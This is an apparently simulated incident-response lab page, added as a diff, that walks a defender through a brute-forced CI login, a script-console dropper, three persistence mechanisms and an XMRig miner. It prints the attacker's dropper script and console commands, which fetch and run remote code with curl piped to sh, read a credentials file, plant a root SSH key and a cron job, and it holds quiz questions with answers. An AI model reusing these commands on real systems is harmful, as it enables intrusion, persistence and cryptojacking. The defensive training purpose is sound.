@@ -1,0 +1,630 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<script src="../../../assets/config.js"></script>
+<script src="../../../assets/shared/neon.js"></script>
+<script src="../../../assets/shared/identity.js"></script>
+<script src="../../../assets/shared/paywall.js"></script>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>The miner in the build server guide &middot; Aayat-AP-Prep</title>
+<style>body{margin:0;background:#f6f6f2;color:#17171f;font:17px/1.6 Georgia,'Times New Roman',serif}main{max-width:800px;margin:0 auto;padding:40px 24px 80px}h1{font-size:34px;line-height:1.15;margin:8px 0 12px}h2{margin-top:44px;padding-top:18px;border-top:2px solid #17171f;font-size:23px}.kick{font:700 12px/1 Arial,sans-serif;letter-spacing:.12em;text-transform:uppercase;color:#555}.meta{font:14px Arial,sans-serif;color:#555}.go{display:flex;flex-wrap:wrap;gap:8px;margin:20px 0}.go a{font:700 14px Arial,sans-serif;padding:10px 14px;border:2px solid #17171f;color:#17171f;text-decoration:none;background:#fff}.go a.main{background:#17171f;color:#fff}pre{background:#101018;color:#e8e8e8;padding:12px 14px;overflow:auto;font:13.5px/1.5 Consolas,Menlo,monospace}pre.want{background:#fff;color:#222;border:1px solid #bbb;max-height:320px}code{font:.9em Consolas,Menlo,monospace}.lab{font:700 12px Arial,sans-serif;color:#555;margin:14px 0 4px}blockquote{border-left:4px solid #17171f;margin:14px 0;padding:2px 14px;background:#fff}@media print{.go{display:none}pre{white-space:pre-wrap}pre.want{max-height:none}body{background:#fff}}</style>
+</head>
+<body><main><p class="kick">Linux server compromise guide</p>
+<h1>The miner in the build server</h1>
+<p class="meta">Intermediate &middot; about 60 min</p>
+<p>Brightloom Games&#x27; build server has run at full CPU all night. Trace a brute-forced CI login to a script console, a dropper, three kinds of persistence and a cryptominer talking to a mining pool, then clean up and rebuild.</p>
+<div class="go"><a class="main" href="../../../notebook.html?ref=rb-miner&amp;runbook=miner">Worked example</a><a href="../../../notebook.html?ref=rb-miner--guided&amp;runbook=miner--guided">Guided</a><a href="../../../notebook.html?ref=rb-miner--solo&amp;runbook=miner--solo">On your own</a></div>
+<p>08:30, Thursday 5 Nov. Monitoring says <strong>build01</strong> at <strong>Brightloom Games</strong> has been above 95% CPU for six hours, and developers say game builds take 38 minutes instead of 6. build01 runs Forgeway CI, a Jenkins-style build server. You are on call.</p>
+<p>The evidence is in <code>~/case</code> (Linux) and <code>case/</code> (Python). The network tools (<code>nmap</code>, <code>curl</code>, <code>wget</code>, <code>tshark</code>, <code>dig</code>, <code>nslookup</code>, <code>host</code>, <code>whois</code>, <code>ping</code>, <code>traceroute</code>, <code>nc</code>, <code>ssh</code>, <code>openssl</code>, <code>nikto</code>, <code>gobuster</code>) work on a recorded copy of the case network; nothing leaves your browser.</p>
+<p>The steps follow the incident response lifecycle: <strong>verify, scope, find the way in, preserve evidence, contain, eradicate, recover, learn</strong>. The order is based on the open LetsDefend incident response playbooks (MIT licence).</p>
+<h3>What you'll learn</h3>
+<ul>
+<li>Spot a cryptominer hiding behind a kernel thread's name</li>
+<li>Prove a brute force on a CI login, and why a script console is a remote shell</li>
+<li>Find three kinds of Linux persistence: cron, systemd and SSH keys</li>
+<li>Follow mining traffic to a pool and contain, eradicate and rebuild</li>
+</ul>
+<h3>How to use this runbook</h3>
+<ul>
+<li>Run a cell with <strong>Shift+Enter</strong> (or its Run button). Run the cells in order: the first Linux cell copies the evidence into <code>~/case</code>.</li>
+<li>Tick each <code>- [ ]</code> box when you have done it.</li>
+<li>Stuck? Open a <strong>Hint</strong> under the step.</li>
+<li>Type your answer into each <strong>check</strong> box and it tells you if you are right. Answers are short: an address, a name, a number or a time such as 09:05.</li>
+<li>Write your notes under each step. Download .ipynb keeps your notes and every output.</li>
+</ul>
+<h2>1. Triage</h2>
+<ul>
+<li>&#9744; Write your name and the time you started here:</li>
+<li>&#9744; Hash the evidence before you touch it</li>
+<li>&#9744; Read the alert, then map the network</li>
+</ul>
+<blockquote>
+<p>Hint: <code>sort -t, -k2 -n</code> sorts a CSV by its second column. Or read cpu_metrics.csv from the top and find where the numbers jump.
+<strong>Question:</strong> How many hosts does <code>nmap -sn 10.60.0.0/24</code> find up?
+<strong>Question:</strong> At what time (HH:MM) did CPU first go above 90%?</p>
+</blockquote>
+<pre><code>cd ~/case
+ls -l . persist suspect
+sha256sum *.* persist/* suspect/*
+echo ---
+cat alert.txt
+echo ---
+awk -F, &#x27;NR &gt; 1 &amp;&amp; $2 &gt; 90 {print; n++} n == 3 {exit}&#x27; cpu_metrics.csv
+echo ---
+nmap -sn 10.60.0.0/24</code></pre>
+<p class="lab">Expected output</p><pre class="want">.:
+total 64
+-rw-r--r--    1 root     root           333 Nov  4 21:27 alert.txt
+-rw-r--r--    1 root     root           822 Nov  4 21:27 auth.log
+-rw-r--r--    1 root     root          6062 Nov  4 21:27 capture.pcap
+-rw-r--r--    1 root     root         22895 Nov  4 21:27 ci_access.log
+-rw-r--r--    1 root     root           839 Nov  4 21:27 ci_audit.log
+-rw-r--r--    1 root     root          2914 Nov  4 21:27 cpu_metrics.csv
+-rw-r--r--    1 root     root           579 Nov  4 21:27 known_bad.txt
+-rw-r--r--    1 root     root          1072 Nov  4 21:27 netflow.csv
+drwxr-xr-x    2 root     root           140 Nov  4 21:27 persist
+-rw-r--r--    1 root     root           483 Nov  4 21:27 ps.txt
+-rw-r--r--    1 root     root           565 Nov  4 21:27 ss.txt
+drwxr-xr-x    2 root     root           100 Nov  4 21:27 suspect
+
+persist:
+total 20
+-rw-r--r--    1 root     root            83 Nov  4 21:27 crontab_forgeway.txt
+-rw-r--r--    1 root     root            76 Nov  4 21:27 etc_cron.d_sysupdate
+-rw-r--r--    1 root     root           208 Nov  4 21:27 root_authorized_keys
+-rw-r--r--    1 root     root           103 Nov  4 21:27 sudoers.d_forgeway
+-rw-r--r--    1 root     root           219 Nov  4 21:27 sysupdate.service
+
+suspect:
+total 12
+-rwxr-xr-x    1 root     root           258 Nov  4 21:27 config.json
+-rwxr-xr-x    1 root     root           307 Nov  4 21:27 kswapd0.strings.txt
+-rwxr-xr-x    1 root     root           796 Nov  4 21:27 x.sh
+4a7156533227b11d189d19a36584471550e7cd865227085f57093cfa2f3a9887  alert.txt
+0473f7824494a3dd3344a4b39ae69a136ae2453e5aa25c9cb29a5d8647bdd9f3  auth.log
+a0309f48ba18026d23536f6073e903fe9b5f05257d23af077d9dd7fca0d0ac82  capture.pcap
+9f9161be98a30eccf708be89af259043b606b7d3d9a59457687806e175e1d29c  ci_access.log
+f63ee13bfb7b36a119a70d741ec58b05e4679da03568002773ef2e55d37c0f1c  ci_audit.log
+93fc1e86b88fe26e2c9d9ae92499857ee60a61e8329d3ee2c84c0eb24d855f53  cpu_metrics.csv
+c3ea094905b2496e4ae60b9fa02f8892f13b7796275ac76c6b20838760ca76fd  known_bad.txt
+d34c081b9e3ee46f05feed63834811adc45162a4146e2d0cfad37e5acfb3fc56  netflow.csv
+8b5ae85d8263a58a5a33bd2528d89d346cec262288454a25f436208b28287966  ps.txt
+45af83a900247c9a766a1612f76c2dcec01641b483f1816276deef1d84835cf4  ss.txt
+7201f44b7479ff8980f00ff1b1ee0415f14b778e35832c842219903a235100cf  persist/crontab_forgeway.txt
+c3d36bf41862fb78d09a13fbc822958909f7c7dc155c33654c9dbaac890c7b21  persist/etc_cron.d_sysupdate
+9f8aa7e49aa743348406c99addb5df55eea80cd3078c6b17014693a73546678b  persist/root_authorized_keys
+554253f31bb695a212e15965fc6d611fb99ad5fbefa4f2ab59ef8ba363282388  persist/sudoers.d_forgeway
+0c1d20d3fce00bbe8de0b8003872408e3daefc24bfe371ae540dc308e0ef79ff  persist/sysupdate.service
+c74355365f8365657a32dbb4ea540260f056872afb173d245df55b99aee765cf  suspect/config.json
+65a6daf753100eba49507216f32e7960e58af62b6727e854e4ab345fa9d6cb50  suspect/kswapd0.strings.txt
+845064c81554efbfaeb6df7477832758034ee5b0e82643a86e288c9a80cc3adc  suspect/x.sh
+---
+MONITORING ALERT  build01.brightloom.lan
+Raised: 2026-11-05 08:30 UTC   Rule: CPU above 95% for 6 hours
+Also: developers report game-client builds take 38+ minutes (normal: 6).
+build01 runs Forgeway CI on port 8080. The firewall forwards ci.brightloom.test:8080
+(192.0.2.60) to it so the outsourced art studio can see build results.
+---
+2026-11-05 02:20,98.5,4.05
+2026-11-05 02:25,98.1,4.32
+2026-11-05 02:30,98.9,4.09
+---
+Starting Nmap 7.94 ( https://nmap.org ) at 2026-11-04 21:27 UTC
+Nmap scan report for gw.brightloom.lan (10.60.0.1)
+Host is up (0.00042s latency).
+MAC Address: 52:54:00:12:34:01 (QEMU virtual NIC)
+Nmap scan report for build01.brightloom.lan (10.60.0.12)
+Host is up (0.00042s latency).
+MAC Address: 52:54:00:12:34:0C (QEMU virtual NIC)
+Nmap scan report for git01.brightloom.lan (10.60.0.20)
+Host is up (0.00042s latency).
+MAC Address: 52:54:00:12:34:14 (QEMU virtual NIC)
+Nmap scan report for dev-ws03.brightloom.lan (10.60.0.31)
+Host is up (0.00042s latency).
+MAC Address: 52:54:00:12:34:1F (QEMU virtual NIC)
+Nmap done: 256 IP addresses (4 hosts up) scanned in 6.68 seconds</pre>
+<h2>2. Verify: is this real?</h2>
+<p>Alerts are often wrong. Before you wake anyone up, decide whether this is a <strong>true positive</strong>.</p>
+<ul>
+<li>&#9744; What exactly raised the alarm, and when?</li>
+<li>&#9744; Name two pieces of evidence that prove something bad really happened</li>
+<li>&#9744; What harmless explanation would make this a false positive? Can you rule it out?</li>
+<li>&#9744; Decision: true positive / false positive (write it here)</li>
+</ul>
+<p>On Linux, real kernel threads such as <code>kswapd0</code> show in <code>ps</code> with square brackets and use almost no CPU. A program in <code>/var/tmp</code> with the same name is a disguise.</p>
+<blockquote>
+<p>Hint: Compare the two kswapd0 lines in ps.txt: who runs them, where they live, and how much CPU they use.
+Hint: ss.txt shows which program owns each network connection.
+<strong>Question:</strong> What is the PID of the fake kswapd0?
+<strong>Question:</strong> Which remote TCP port is the fake kswapd0 connected to?</p>
+</blockquote>
+<pre><code>grep -E &#x27;kswapd0|java|PID&#x27; ps.txt
+echo ---
+grep -E &#x27;kswapd0|State&#x27; ss.txt
+echo ---
+cat suspect/config.json</code></pre>
+<p class="lab">Expected output</p><pre class="want">USER         PID %CPU %MEM COMMAND
+root          98  0.0  0.0 [kswapd0]
+forgeway     911  6.1 18.4 /usr/bin/java -jar /usr/share/forgeway/forgeway.war --httpPort=8080
+root        4242 391.7  3.2 /var/tmp/.cache/kswapd0 -c /var/tmp/.cache/config.json
+---
+State   Recv-Q Send-Q  Local Address:Port    Peer Address:Port   Process
+ESTAB   0      0          10.60.0.12:41822   198.51.100.77:3333   users:((&quot;kswapd0&quot;,pid=4242))
+---
+{
+ &quot;autosave&quot;: false,
+ &quot;cpu&quot;: {
+  &quot;enabled&quot;: true,
+  &quot;max-threads-hint&quot;: 100
+ },
+ &quot;donate-level&quot;: 0,
+ &quot;pools&quot;: [
+  {
+   &quot;url&quot;: &quot;pool.hashmoat.example:3333&quot;,
+   &quot;user&quot;: &quot;4BrxWallet9aQm2Lp7&quot;,
+   &quot;pass&quot;: &quot;build01&quot;,
+   &quot;tls&quot;: false
+  }
+ ],
+ &quot;background&quot;: true
+}</pre>
+<h2>3. Scope: what is exposed?</h2>
+<ul>
+<li>&#9744; Which services does build01 offer, and which of them can the internet reach?</li>
+<li>&#9744; What does the CI login page reveal to anyone who visits?</li>
+<li>&#9744; Is the script console open to people who are not signed in?</li>
+</ul>
+<blockquote>
+<p>Hint: alert.txt says the firewall forwards ci.brightloom.test:8080 to build01. Anything on that port is on the internet.
+<strong>Question:</strong> Which TCP port does Forgeway CI listen on?</p>
+</blockquote>
+<pre><code>nmap -sV build01.brightloom.lan
+nmap -sV -p 8080 ci.brightloom.test
+echo ---
+curl -s http://ci.brightloom.test:8080/login
+echo ---
+curl -i -s http://ci.brightloom.test:8080/script
+curl -s http://ci.brightloom.test:8080/robots.txt</code></pre>
+<p class="lab">Expected output</p><pre class="want">Starting Nmap 7.94 ( https://nmap.org ) at 2026-11-04 21:27 UTC
+Nmap scan report for build01.brightloom.lan (10.60.0.12)
+Host is up (0.00042s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT      STATE  SERVICE        VERSION
+22/tcp    open   ssh            OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+8080/tcp  open   http           Jetty 10.0.18 (Forgeway CI 2.401.1)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Nmap done: 1 IP address (1 host up) scanned in 3.47 seconds
+Starting Nmap 7.94 ( https://nmap.org ) at 2026-11-04 21:27 UTC
+Nmap scan report for ci.brightloom.test (192.0.2.60)
+Host is up (0.048s latency).
+PORT      STATE  SERVICE        VERSION
+8080/tcp  open   http           Jetty 10.0.18 (Forgeway CI 2.401.1)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Nmap done: 1 IP address (1 host up) scanned in 3.47 seconds
+---
+&lt;!doctype html&gt;
+&lt;title&gt;Sign in [Forgeway]&lt;/title&gt;
+&lt;h1&gt;Welcome to Forgeway CI&lt;/h1&gt;
+&lt;form method=&quot;post&quot; action=&quot;/j_security_check&quot;&gt;
+Username &lt;input name=&quot;j_username&quot;&gt; Password &lt;input type=&quot;password&quot; name=&quot;j_password&quot;&gt;
+&lt;button&gt;Sign in&lt;/button&gt;
+&lt;/form&gt;
+&lt;footer&gt;Forgeway 2.401.1&lt;/footer&gt;
+---
+HTTP/1.1 403 Forbidden
+Server: Jetty(10.0.18)
+Date: Wed, 04 Nov 2026 21:27:45 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 148
+Connection: keep-alive
+
+&lt;!doctype html&gt;
+&lt;title&gt;403 Forbidden&lt;/title&gt;
+&lt;h1&gt;Authentication required&lt;/h1&gt;
+&lt;p&gt;You are authenticated as: anonymous. Sign in to use this page.&lt;/p&gt;
+# we plan to put Forgeway behind the VPN one day
+User-agent: *
+Disallow: /</pre>
+<h2>4. Initial access: the login page</h2>
+<ul>
+<li>&#9744; Count the failed sign-ins and find the address they came from</li>
+<li>&#9744; Which username was guessed, and when did a guess work?</li>
+<li>&#9744; Why didn't the server stop it after ten tries?</li>
+</ul>
+<blockquote>
+<p>Hint: A failed sign-in is <code>POST /j_security_check</code> with status 401. A working one gets 302 (a redirect to the dashboard).
+Hint: ci_audit.log names the user. The 2024 lines explain why the password was weak and never locked.
+<strong>Question:</strong> How many failed sign-ins came from 203.0.113.99?
+<strong>Question:</strong> Which username did the attacker guess?
+<strong>Question:</strong> At what time (HH:MM) did the guess work?</p>
+</blockquote>
+<pre><code>grep j_security_check ci_access.log | awk &#x27;{print $1, $9}&#x27; | sort | uniq -c | sort -rn
+echo ---
+grep &#x27; 302 &#x27; ci_access.log | grep j_security_check
+echo ---
+grep -E &#x27;login|setup|security&#x27; ci_audit.log</code></pre>
+<p class="lab">Expected output</p><pre class="want">    177 203.0.113.99 401
+      1 203.0.113.99 302
+---
+203.0.113.99 - - [05/Nov/2026:02:13:04 +0000] &quot;POST /j_security_check HTTP/1.1&quot; 302 0 &quot;-&quot; &quot;python-requests/2.31.0&quot;
+---
+2024-02-11T10:02:44Z setup: setup wizard skipped by admin (local user database, sign-up disabled)
+2024-02-11T10:03:10Z security: password set for user admin
+2026-11-05T02:13:04Z login: user=admin from=203.0.113.99 (after 0 lockouts: account lockout is not enabled)</pre>
+<h2>5. From login to shell: the script console</h2>
+<p>A CI server's script console runs any code on the server, as the CI user. Admin on a CI server means a shell on the box, and access to every secret the builds use.</p>
+<ul>
+<li>&#9744; What did the attacker run through the console? List both scripts</li>
+<li>&#9744; Which secrets file did they read? What lives in it (Git tokens, cloud keys, signing keys)?</li>
+<li>&#9744; Where did the dropper script come from?</li>
+</ul>
+<blockquote>
+<p>Hint: <code>grep script-console ci_audit.log</code> shows each script. The second one downloads and runs a shell script with <code>curl | sh</code>.
+<strong>Question:</strong> Which file of secrets did the attacker print through the console? (file name)
+<strong>Question:</strong> Which IP address served x.sh?</p>
+</blockquote>
+<pre><code>grep -E &#x27;POST /script|GET /script&#x27; ci_access.log
+echo ---
+grep script-console ci_audit.log
+echo ---
+tshark -r capture.pcap -Y &#x27;http.request and ip.src==10.60.0.12&#x27; -T fields -e frame.time_relative -e ip.dst -e http.request.uri -e http.user_agent</code></pre>
+<p class="lab">Expected output</p><pre class="want">203.0.113.99 - - [05/Nov/2026:02:14:20 +0000] &quot;GET /script HTTP/1.1&quot; 200 5230 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/130.0&quot;
+203.0.113.99 - - [05/Nov/2026:02:14:51 +0000] &quot;POST /script HTTP/1.1&quot; 200 4180 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/130.0&quot;
+203.0.113.99 - - [05/Nov/2026:02:15:02 +0000] &quot;POST /script HTTP/1.1&quot; 200 1210 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/130.0&quot;
+---
+2026-11-05T02:14:51Z script-console: user=admin script=&quot;println(new File(&#x27;/var/lib/forgeway/credentials.xml&#x27;).text)&quot;
+2026-11-05T02:15:02Z script-console: user=admin script=&quot;[&#x27;sh&#x27;,&#x27;-c&#x27;,&#x27;curl -fsSL http://198.51.100.23/x.sh | sh&#x27;].execute()&quot;
+---
+1533.000000	198.51.100.23	/x.sh	curl/7.81.0
+1534.000000	198.51.100.23	/kswapd0	curl/7.81.0
+1539.000000	198.51.100.23	/config.json	curl/7.81.0
+1540.000000	198.51.100.23	/sysupdate.service	curl/7.81.0
+1571.000000	198.51.100.23	/k.pub	curl/7.81.0</pre>
+<h2>6. Read the dropper and the miner</h2>
+<p>Read <code>x.sh</code> line by line. Never run malware to see what it does; read it.</p>
+<ul>
+<li>&#9744; Which competing miners does it kill first?</li>
+<li>&#9744; Which files does it download, and where does it hide them?</li>
+<li>&#9744; How does it become root? What is in <code>persist/sudoers.d_forgeway</code>, and why was it added?</li>
+<li>&#9744; What do the strings say the "kswapd0" program really is?</li>
+</ul>
+<blockquote>
+<p>Hint: <code>sudo -n</code> runs a command as root only if no password is needed. The sudoers line explains why that worked.
+<strong>Question:</strong> Which account ran sudo to install the persistence?
+<strong>Question:</strong> Which sudoers keyword let it become root without a password?</p>
+</blockquote>
+<pre><code>cat -n suspect/x.sh
+echo ---
+cat persist/sudoers.d_forgeway
+grep sudo auth.log
+echo ---
+head -3 suspect/kswapd0.strings.txt
+echo ---
+sha256sum suspect/* | while read h f; do
+    grep -q &quot;$h&quot; known_bad.txt &amp;&amp; echo &quot;KNOWN BAD: $f&quot; || echo &quot;not listed: $f&quot;
+done</code></pre>
+<p class="lab">Expected output</p><pre class="want">     1	#!/bin/sh
+     2	D=/var/tmp/.cache
+     3	mkdir -p $D &amp;&amp; cd $D
+     4	pkill -f xmrig 2&gt;/dev/null; pkill -f kdevtmpfsi 2&gt;/dev/null
+     5	curl -fsSL http://198.51.100.23/kswapd0 -o kswapd0 &amp;&amp; chmod +x kswapd0
+     6	curl -fsSL http://198.51.100.23/config.json -o config.json
+     7	cat &gt; /tmp/.inst.sh &lt;&lt;&#x27;EOS&#x27;
+     8	cp /var/tmp/.cache/sysupdate.service /etc/systemd/system/sysupdate.service
+     9	systemctl daemon-reload &amp;&amp; systemctl enable --now sysupdate.service
+    10	echo &#x27;*/15 * * * * root curl -fsSL http://198.51.100.23/x.sh | sh &gt;/dev/null 2&gt;&amp;1&#x27; &gt; /etc/cron.d/sysupdate
+    11	mkdir -p /root/.ssh &amp;&amp; curl -fsSL http://198.51.100.23/k.pub &gt;&gt; /root/.ssh/authorized_keys
+    12	EOS
+    13	curl -fsSL http://198.51.100.23/sysupdate.service -o sysupdate.service
+    14	sudo -n /bin/sh /tmp/.inst.sh || nohup ./kswapd0 -c config.json &gt;/dev/null 2&gt;&amp;1 &amp;
+    15	rm -f /tmp/.inst.sh
+    16	history -c
+---
+# /etc/sudoers.d/forgeway (added 2024-02-11 so builds can run docker)
+forgeway ALL=(ALL) NOPASSWD: ALL
+Nov  5 02:15:40 build01 sudo: forgeway : TTY=unknown ; PWD=/var/tmp/.cache ; USER=root ; COMMAND=/bin/sh /tmp/.inst.sh
+Nov  5 02:15:40 build01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by (uid=998)
+---
+XMRig 6.21.0
+ built on Oct 12 2026 with GCC
+donate-level
+---
+not listed: suspect/config.json
+not listed: suspect/kswapd0.strings.txt
+KNOWN BAD: suspect/x.sh</pre>
+<h2>7. Persistence: every way back in</h2>
+<p>Attackers rarely leave one way back. If you remove one and miss another, the miner is back in 15 minutes.</p>
+<ul>
+<li>&#9744; The cron file: how often does it re-download x.sh?</li>
+<li>&#9744; The systemd service: what does it start, and what happens if you kill the process?</li>
+<li>&#9744; The SSH keys: which key doesn't belong? Was it used? (A CTF flag is in the key's comment.)</li>
+<li>&#9744; The forgeway user's own crontab: is it clean?</li>
+</ul>
+<blockquote>
+<p>Hint: In cron, <code>*/15</code> in the minute field means every 15 minutes. In systemd, <code>Restart=always</code> brings a killed process back.
+Hint: Compare the two keys in root_authorized_keys. Then grep auth.log for root logins.
+<strong>Question:</strong> How many different persistence mechanisms did the attacker add?
+<strong>Question:</strong> What is the file name of the attacker's systemd unit?
+<strong>Question:</strong> At what time (HH:MM) did the attacker log back in as root over SSH?</p>
+</blockquote>
+<pre><code>for f in persist/*; do echo &quot;== $f&quot;; cat &quot;$f&quot;; done
+echo ---
+grep -E &#x27;publickey for root|sysupdate&#x27; auth.log</code></pre>
+<p class="lab">Expected output</p><pre class="want">== persist/crontab_forgeway.txt
+# m h dom mon dow command
+30 3 * * * /usr/share/forgeway/bin/cleanup-workspaces.sh
+== persist/etc_cron.d_sysupdate
+*/15 * * * * root curl -fsSL http://198.51.100.23/x.sh | sh &gt;/dev/null 2&gt;&amp;1
+== persist/root_authorized_keys
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMd2Pz8kQwErTy5uIoPa3SdFgHjKl9ZxCvBnM1qW2eRt ops@brightloom.test
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHq7mXbV0aJk3d9sTqPz1wLr8YcN5eUf2GhKoM4vB6xZ [flag hidden: run the lab to find it]
+== persist/sudoers.d_forgeway
+# /etc/sudoers.d/forgeway (added 2024-02-11 so builds can run docker)
+forgeway ALL=(ALL) NOPASSWD: ALL
+== persist/sysupdate.service
+[Unit]
+Description=System update helper
+After=network-online.target
+
+[Service]
+ExecStart=/var/tmp/.cache/kswapd0 -c /var/tmp/.cache/config.json
+Restart=always
+RestartSec=30
+Nice=10
+
+[Install]
+WantedBy=multi-user.target
+---
+Nov  5 02:15:45 build01 systemd[1]: Started sysupdate.service - System update helper.
+Nov  5 02:31:17 build01 sshd[4501]: Accepted publickey for root from 203.0.113.99 port 40022 ssh2: ED25519 SHA256:Hq7mXbV0aJk</pre>
+<h2>8. The network</h2>
+<ul>
+<li>&#9744; Which name did build01 look up just before mining started?</li>
+<li>&#9744; What does the first message to port 3333 contain? (stratum <code>login</code> with a wallet)</li>
+<li>&#9744; How long has the pool connection been open, and how much did it send?</li>
+</ul>
+<blockquote>
+<p>Hint: Mining pools speak <em>stratum</em>, a JSON protocol: <code>login</code> once, then many <code>submit</code> messages with the work done.
+<strong>Question:</strong> Which domain did build01 look up for the pool?</p>
+</blockquote>
+<pre><code>tshark -r capture.pcap -Y dns -T fields -e frame.time_relative -e ip.src -e dns.qry.name
+echo ---
+tshark -r capture.pcap -Y &#x27;tcp.dstport==3333&#x27; -c 4
+echo ---
+tshark -r capture.pcap -q -z conv,ip</code></pre>
+<p class="lab">Expected output</p><pre class="want">1582.000000	10.60.0.12	pool.hashmoat.example
+1582.020000	10.60.0.1	pool.hashmoat.example
+---
+    32 1583.000000      10.60.0.12 → 198.51.100.77   TCP        74 41822 → 3333 [SYN] Seq=0 Win=64240 Len=0
+    33 1583.100000      10.60.0.12 → 198.51.100.77   TCP       260 41822 → 3333 [PSH, ACK] Len=194 {id:1, method:login, params:{login:4BrxWallet9aQm2Lp7, pass:build01, agent:XMRig/6.21.0}}
+    35 1626.000000      10.60.0.12 → 198.51.100.77   TCP       220 41822 → 3333 [PSH, ACK] Len=154 {id:2, method:submit, params:{job_id:812, nonce:71ef0ff6}}
+    36 1669.000000      10.60.0.12 → 198.51.100.77   TCP       220 41822 → 3333 [PSH, ACK] Len=154 {id:3, method:submit, params:{job_id:813, nonce:1b054977}}
+---
+================================================================================
+IPv4 Conversations
+Filter:&lt;No Filter&gt;
+                                                 Frames        Bytes
+10.60.0.12 &lt;-&gt; 203.0.113.99                          24        13 kB
+10.60.0.12 &lt;-&gt; 198.51.100.23                          7         3 kB
+10.60.0.12 &lt;-&gt; 198.51.100.77                          9         3 kB
+10.60.0.1 &lt;-&gt; 10.60.0.12                              2    188 bytes
+10.60.0.12 &lt;-&gt; 10.60.0.31                             1    170 bytes
+================================================================================
+(Counted from the frames in this trimmed capture.)</pre>
+<pre><code>import csv
+from collections import defaultdict
+
+out = defaultdict(int)
+rows = list(csv.DictReader(open(&quot;case/netflow.csv&quot;)))
+for r in rows:
+    if r[&quot;src&quot;] == &quot;10.60.0.12&quot;:
+        out[r[&quot;dst&quot;] + &quot;:&quot; + r[&quot;dport&quot;]] += int(r[&quot;bytes_out&quot;])
+for k, v in sorted(out.items(), key=lambda x: -x[1]):
+    print(f&quot;{k:22} {v:&gt;12,} bytes out&quot;)
+pool = [r[&quot;time&quot;][11:16] for r in rows if r[&quot;dport&quot;] == &quot;3333&quot;]
+print(&quot;pool flows seen at:&quot;, pool)</code></pre>
+<h2>9. Who is behind it?</h2>
+<ul>
+<li>&#9744; What is the dropper host, and when was its domain registered?</li>
+<li>&#9744; Look up the wallet on the pool: how many machines mine for it? What does that tell you about the campaign?</li>
+<li>&#9744; Who should get an abuse report?</li>
+</ul>
+<p>In a real case, ask before you touch an attacker's servers: it can tip them off, and some actions are illegal. Looking up a public pool page is fine.</p>
+<blockquote>
+<p>Hint: The wallet is in suspect/config.json. Put it at the end of the pool's /api/wallet/ address.
+<strong>Question:</strong> How many workers does the pool show online for this wallet?</p>
+</blockquote>
+<pre><code>dig +short dl.sysupdate-mirror.example
+dig -x 203.0.113.99 +short
+whois sysupdate-mirror.example
+echo ---
+curl -s https://pool.hashmoat.example/api/wallet/4BrxWallet9aQm2Lp7
+echo ---
+whois 203.0.113.99</code></pre>
+<p class="lab">Expected output</p><pre class="want">198.51.100.23
+scan-07.vpsfarm.example.
+% Lab whois record for sysupdate-mirror.example
+
+Domain Name: SYSUPDATE-MIRROR.EXAMPLE
+Created: 2026-11-01 (4 days before the attack)
+Registrar: Budget Names Ltd
+Registrant: REDACTED FOR PRIVACY
+NetRange: 198.51.100.0 - 198.51.100.63
+OrgName: Cheap Hosting VPS (accepts crypto, no ID checks)
+Abuse: abuse@cheap-hosting.example
+---
+{
+ &quot;wallet&quot;: &quot;4BrxWallet9aQm2Lp7&quot;,
+ &quot;hashrate&quot;: &quot;41.2 kH/s&quot;,
+ &quot;workers_online&quot;: 37,
+ &quot;workers&quot;: [
+  &quot;build01&quot;,
+  &quot;ci-runner-2&quot;,
+  &quot;gitlab-old&quot;,
+  &quot;jenkins-qa&quot;,
+  &quot;...33 more&quot;
+ ],
+ &quot;first_seen&quot;: &quot;2026-11-01T22:40:11Z&quot;,
+ &quot;paid_xmr&quot;: &quot;0.83&quot;
+}
+---
+% Lab whois record for 203.0.113.99
+
+NetRange: 203.0.113.0 - 203.0.113.255
+OrgName: VPS Farm (hourly servers)
+Abuse: abuse@vpsfarm.example
+Comment: Seen scanning port 8080 for CI login pages on many networks.</pre>
+<h2>10. Initial access: how did they get in?</h2>
+<p>The way in is the door you must close, or it happens again. Tick the one the evidence supports, and write the evidence next to it.</p>
+<ul>
+<li>&#9744; Phishing (a message that tricked someone)</li>
+<li>&#9744; Exploit of a public-facing application (a website or service bug)</li>
+<li>&#9744; Valid accounts (a real username and password or key, stolen or misused)</li>
+<li>&#9744; External remote services (VPN, remote desktop, SSH)</li>
+<li>&#9744; Drive-by compromise (a booby-trapped website)</li>
+<li>&#9744; Supply chain or trusted partner</li>
+<li>&#9744; Hardware added (a USB device or rogue machine)</li>
+<li>&#9744; Insider using access they were given</li>
+<li>&#9744; No intrusion (for example, traffic from outside that never got in)</li>
+</ul>
+<h2>11. Preserve the evidence</h2>
+<p>Cleaning up destroys evidence. Copy everything to a safe place, record the hashes and pack it before you change anything.</p>
+<ul>
+<li>&#9744; Copy the evidence and write SHA256SUMS</li>
+<li>&#9744; Note who collected it, when, and where it is stored (chain of custody)</li>
+</ul>
+<blockquote>
+<p>Hint: Collect before you clean. Once you delete the cron file and kill the miner, that evidence is gone forever.</p>
+</blockquote>
+<pre><code>mkdir -p ~/evidence &amp;&amp; cp -r ~/case/* ~/evidence/
+cd ~/evidence &amp;&amp; find . -type f ! -name SHA256SUMS -exec sha256sum {} + &gt; SHA256SUMS
+pack=~/evidence-$(date -u +%Y%m%dT%H%M).tar
+tar cf &quot;$pack&quot; -C ~/evidence .
+(gzip -f &quot;$pack&quot; 2&gt;/dev/null &amp;&amp; echo &quot;packed $pack.gz&quot;) || echo &quot;packed $pack&quot;
+ls -l ~/evidence-*
+wc -l SHA256SUMS
+cd ~/case</code></pre>
+<p class="lab">Expected output</p><pre class="want">packed /root/evidence-20261104T2127.tar.gz
+-rw-r--r--    1 root     root          7716 Nov  4 21:27 /root/evidence-20261104T2127.tar.gz
+18 SHA256SUMS</pre>
